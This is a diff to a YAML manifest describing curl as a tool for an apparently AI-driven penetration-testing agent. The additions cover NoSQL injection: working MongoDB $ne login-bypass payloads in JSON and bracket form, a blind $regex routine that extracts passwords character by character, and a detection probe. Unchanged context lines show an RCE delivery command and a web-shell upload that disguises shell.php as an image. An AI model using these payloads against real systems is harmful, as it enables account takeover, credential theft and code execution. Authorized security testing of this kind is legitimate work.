@@ -5,7 +5,15 @@ version: "7.88.1"
 description: "HTTP/HTTPS/FTP client with HTTP/2, HTTP/3, NTLM, Kerberos, and TLS 1.3 support. The Swiss Army knife for web-layer pentesting: send arbitrary requests with custom methods/headers/bodies, deliver RCE payloads, upload web shells via multipart, download files (text or binary). Supports cookies, auth (basic/digest/NTLM/negotiate), redirect following, proxy chains, SSL bypass, certificate auth, and per-step timing instrumentation. The native CLI; LLM constructs the full curl invocation. Use playwright for JavaScript-rendered pages or web-session for stateful login flows."
 image: "ghcr.io/silicon-works/mcp-tools-curl:latest"
 image_size_mb: 100
-timeout_seconds: 60
+# Dual-clock model:
+#   idle_timeout_seconds — silence between MCP heartbeats (60 s — curl
+#     emits output as it streams; 60 s silent means stuck or no progress)
+#   max_runtime_seconds  — hard wall-clock cap; never resets on heartbeat
+#     (10 min — curl request/response should never take longer than this)
+# Legacy `timeout_seconds` is used by older clients as the hard cap.
+idle_timeout_seconds: 60
+max_runtime_seconds: 600
+timeout_seconds: 600
 
 capabilities:
   - http_request
@@ -16,6 +24,7 @@ capabilities:
   - api_interaction
   - header_inspection
   - tls_test
+  - nosql_injection
 
 phases:
   - reconnaissance
@@ -34,6 +43,7 @@ routing:
     - "test SSL/TLS configuration or follow a redirect chain"
     - "exercise NTLM/Negotiate/Digest auth against an HTTP service"
     - "trigger SSRF via crafted URL parameters"
+    - "test NoSQL injection (MongoDB operator injection: $ne / $regex / $where) — auth bypass and blind exfiltration on MongoDB-backed apps"
   never_use_for:
     - "directory or parameter brute-forcing — use ffuf"
     - "rendering JavaScript-heavy pages — use playwright"
@@ -49,6 +59,14 @@ routing:
     - "exploit payload"
     - "api call"
     - "check headers"
+    - "nosql injection"
+    - "mongodb injection"
+    - "mongodb auth bypass"
+    - "operator injection"
+    - "$ne"
+    - "$regex"
+    - "$where"
+    - "blind nosql exfiltration"
 
 requirements:
   network: true
@@ -156,6 +174,26 @@ usage_patterns:
     command: "curl -sS -b 'session={session_cookie}' -X POST -d 'cmd={url_encoded_command}' -o {output} {url}"
     when: "Deliver an RCE payload to a vulnerable endpoint requiring a valid session cookie"
 
+  # ── NoSQL injection (replaces nosqlmap; MongoDB operator-injection methodology) ────
+  # Detection upstream: nuclei NoSQL templates flag candidate endpoints. Confirmation
+  # and exploitation belong to curl + crafted JSON below. Post-foothold MongoDB
+  # enumeration is the `mongodb` tool's job, not curl's.
+  - name: "NoSQL auth bypass — MongoDB $ne operator (JSON body)"
+    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{nosql_payload}' -i -o {output} {url}"
+    when: "Bypass a MongoDB-backed login form that accepts JSON. Build nosql_payload as '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}' — the $ne (not-equal) operator makes the query match the first document in the collection (typically admin). -i includes response headers so the agent can spot the Set-Cookie / 302-to-dashboard signal that confirms bypass. Compare against a baseline {\"username\":\"x\",\"password\":\"x\"} response (expect 401)"
+
+  - name: "NoSQL auth bypass — bracket syntax (form-urlencoded body)"
+    command: "curl -sS -X POST -d '{user_field}[$ne]=&{pass_field}[$ne]=' -i -o {output} {url}"
+    when: "Same MongoDB $ne auth-bypass for endpoints that accept form-urlencoded with deep key parsing (Express body-parser, PHP). Server translates 'username[$ne]=' into {username: {$ne: ''}} before the Mongo query. Use when the JSON variant returns 415 Unsupported Media Type or the server only accepts form bodies"
+
+  - name: "NoSQL blind regex exfiltration (boolean-blind, byte-by-byte)"
+    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{nosql_payload}' -o {output} {url}"
+    when: "Exfiltrate a MongoDB document field byte-by-byte once a username is known. Build nosql_payload as '{\"username\":\"{known_user}\",\"password\":{\"$regex\":\"^{prefix}.*\"}}' — login succeeds when prefix matches the real password's start. Loop prefix character-by-character (a-z, A-Z, 0-9, common symbols), widening as matches succeed. Boolean-blind: distinguish via response status / body diff / Set-Cookie. This is the workhorse that replaces nosqlmap's blind extraction"
+
+  - name: "NoSQL detection — operator injection probe (bare $ne)"
+    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"{param}\":{\"$ne\":\"x\"}}' -i -o {output} {url}"
+    when: "Single-shot probe to detect whether an endpoint passes JSON values directly to a Mongo query. If the server returns HTTP 500 or a different response than for {\"{param}\":\"x\"}, the field is unsafely interpolated and operator injection is exploitable. Use after nuclei NoSQL templates flag a candidate, before committing to full auth-bypass / exfiltration runs"
+
 output_formats:
   - flag: "-o {path}"
     format: "body_to_file"
@@ -245,6 +283,13 @@ gotchas:
   - "HTTP/3 is opt-in: --http3 (or --http3-only). Some lab targets only speak HTTP/3 for testing"
   - "When uploading with -F to bypass MIME checks, set type explicitly: -F 'file=@shell.php;type=image/jpeg'"
   - "%{json} write-out gives you everything: timing, sizes, headers — use it for one-shot diagnostic runs"
+  - "Exit codes carry meaning: 6=DNS, 7=connect refused, 28=timeout, 35=SSL handshake, 47=redirect loop, 52=empty reply, 56=recv error, 60=cert verify. Treat 6/7/28/52/56 as retryable; 35/47/60 as config errors (don't retry without changing flags)"
+  - "Redirect chains with -i -L produce CONCATENATED header blocks separated by blank lines — the LAST `HTTP/x` status line is the final response. Don't grep the first one"
+  - "RCE payload encoding: when injecting a command into a URL path, single-encode (curl already URL-encodes the URL); when injecting into a query string already inside a URL-encoded body, double-encode. base64 the payload first if the target shell mangles quotes/spaces"
+  - "Binary downloads: NEVER let multi-MB content land in stdout — use `-o /session/file.bin`. If you must capture in stdout (e.g., piping into another tool), expect base64 wrapping at the client layer"
+  - "Auto-decompression: curl does NOT auto-gunzip when -o writes to disk. If the URL ends `.gz` and you want the inflated file, save as `.gz` then `gunzip` it (or stream through `--compressed` if the server supports it)"
+  - "HTTP/2 empty-body responses sometimes lack the trailing `\\r\\n\\r\\n` separator — `-i` output may show only the status line + headers with no body section. This is normal for 204/304 and HEAD-style responses, not a parsing bug"
+  - "`-w '%{json}'` returns ALL fields in seconds (floats); convert to ms for human-readable timing. `time_appconnect - time_connect` = TLS handshake duration (zero for plain HTTP)"
 
 failure_signatures:
   - signal: "Could not resolve host"
